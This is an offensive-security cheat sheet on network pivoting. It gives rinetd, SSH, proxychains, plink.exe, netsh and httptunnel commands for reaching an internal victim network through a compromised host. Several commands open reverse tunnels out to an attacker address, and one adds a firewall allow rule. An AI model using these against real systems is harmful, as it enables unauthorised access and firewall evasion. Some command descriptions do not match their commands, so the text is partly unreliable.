# Tunneling

---

- [RINETD](#rinetd)
- [SSH Port Forwarding](#ssh-port-forwarding)

<a name="rinetd"></a>
## RINETD
Attacker -> Rooted Internet Connected Machine -> Internal Computer

```sh
sudo apt install rinetd
```

RINETD configuration file
```sh
cat /etc/rinetd.conf
```

Bind local port 80 on kali to Google's ip port 80. By visiting kali IP on internal computer it can access google host.
```sh
0.0.0.0 80 216.58.198.164 80
```

Restart the RINETD service
```sh
sudo service rinetd restart
```

<a name="ssh-port-forwarding"></a>
## SSH Port Forwarding

### Local Port Forwarding
```sh
ssh -N -L [bind_address:]port:host:hostport [username@address]
```

### Remote Port Forwarding
```sh
ssh -N -R [bind_address:]port:host:hostport [username@address]
```

| Argument       | Description                                  |
| :-             | :-                                           |
| -N             | Dont need to execute commands, just forward. |
| -L             | Port forward                                 |
| -R             | Remote port forwarding                       |

Forwards port L__VICTIM_PORT__ from the victim to __ATTACKER_IP__ on attacker port __ATTACKER_PORT__.
```sh
ssh -L__VICTIM_PORT__:__ATTACKER_IP__:__ATTACKER_PORT__ john@__VICTIM_IP__
```

Forward anything going to local port 445 to the victim machine __VICTIM_IP__ throught the pivot machine 192.168.1.24.
```sh
sudo ssh -N -L 0.0.0.0:445:192.168.1.24:445 john@__VICTIM_IP__
```

Forward local port __VICTIM_PORT__ from the victim machine to the attacking machine on port __ATTACKER_PORT__.
```sh
ssh -N -R __ATTACKER_IP__:__ATTACKER_PORT__:__VICTIM_IP__:__VICTIM_PORT__ john@__ATTACKER_IP__
```

## Proxychains
Dynamic port forwarding to the attacking machine. All traffic on local port 8081 gets directed to any host on the victim network.
```sh
sudo ssh -N -D __ATTACKER_IP__:__ATTACKER_PORT__ john@__VICTIM_IP__
```

```sh
cat /etc/proxychains.conf
```

Add to proxychains.
```sh
socks4 __ATTACKER_IP__ __ATTACKER_PORT__
```

Run the tool through proxychains
```sh
sudo proxychains nmap --top-ports=20 -sT -Pn __VICTIM_IP__
```

## PLink.exe
Forward remote port to local address. SSH into attcker forwarding port __VICTIM_PORT__ to attacker's __ATTACKER_PORT__.
```sh
plink.exe -ssh -l john -pw password123 -R __ATTACKER_IP__:__ATTACKER_PORT__:__VICTIM_IP__:__VICTIM_PORT__ __ATTACKER_IP__
```

Automatically respond with y for the cache question.
```sh
cmd.exe /c echo y | plink.exe -ssh -l john -pw password123 -R __ATTACKER_IP__:__ATTACKER_PORT__:__VICTIM_IP__:__VICTIM_PORT__ __ATTACKER_IP__
```

Forward local victim port __VICTIM_PORT__ on the local victim ip address to attackers remote address on attackers port __ATTACKER_PORT__.
```sh
plink.exe -ssh -l john -pw password123 -L __VICTIM_IP__:__VICTIM_PORT__:__ATTACKER_IP__:__ATTACKER_PORT__ __ATTACKER_IP__
```

## NETSH
Installed by default on Windows, SYSTEM can override UAC.

Redirect traffic destine for pivot machine (192.168.0.1) to the victim __VICTIM_IP__ on port 445.
```sh
netsh interface portproxy add v4tov4 listenport=4455 listenaddress=192.168.0.1 connectport=445 connectaddress=__VICTIM_IP__
```

Add a firewall rule to allow inbound connection on port 4455.
```sh
netsh advfirewall firewall add rule name="forward_port_rule" protocol=TCP dir=in localip=192.168.0.1 localport=4455 action=allow
```

## HTTPTunnel-ing
```sh
sudo apt install httptunnel
```

On pivot, forward all local traffic on port __ATTACKER_PORT__ to the __VICTIM_IP__ on port __VICTIM_PORT__.
```sh
ssh -L 0.0.0.0:__ATTACKER_PORT__:__VICTIM_IP__:__VICTIM_PORT__ student@127.0.0.1
```

Confirm port __ATTACKER_PORT__ is listening.
```sh
ss -antp | grep "__ATTACKER_PORT__"
```

HttpTunnel server forwards all traffic on 1234 to port __ATTACKER_PORT__. (Run on victim also).
```sh
hts --forward-port localhost:__ATTACKER_PORT__ 1234
```

HttpTunnel client runs on attacker passes all local data on port 8081 to port 1234 on the victim.
```sh
htc --forward-port 8081 192.168.0.1:1234
```

Connect to the RDP port on the victim.
```sh
rdesktop 127.0.0.1:8081
```
